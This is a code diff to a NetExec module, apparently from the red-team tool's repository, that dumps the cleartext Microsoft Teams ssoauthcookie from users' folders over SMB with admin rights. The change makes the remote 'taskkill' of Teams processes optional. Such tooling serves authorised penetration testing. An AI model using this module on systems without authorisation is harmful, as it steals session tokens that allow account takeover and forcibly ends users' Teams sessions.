@@ -6,16 +6,18 @@ from os.path import abspath, join
 
 class NXCModule:
     name = "teams_localdb"
-    description = "Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process"
+    description = "Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database"
     supported_protocols = ["smb"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
-        """No options available"""
+        """KILL         Kill all Teams processes before retrieving the Cookies database. Default: False"""
+        self.kill = module_options.get("KILL", "false").lower() == "true"
 
     def on_admin_login(self, context, connection):
-        context.log.display("Killing all Teams process to open the cookie file")
-        connection.execute("taskkill /F /T /IM teams.exe")
+        if self.kill:
+            context.log.display("Killing all Teams processes to open the cookie file")
+            connection.execute("taskkill /F /T /IM teams.exe")
         found = 0
         paths = connection.spider("C$", folder="Users", regex=["[a-zA-Z0-9]*"], depth=0)
         with open(abspath(join(TMP_PATH, "teams_cookies2.txt")), "wb") as f:
@@ -33,6 +35,8 @@ class NXCModule:
                         context.log.debug(str(e))
                         context.log.highlight("Found Cookie file in path " + path)
                         context.log.fail("Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database")
+                        if not self.kill:
+                            context.log.display("Use -o KILL=True to terminate Teams before retrieving the Cookies database")
         if found == 0:
             context.log.display("No cookie file found in Users folder")
 
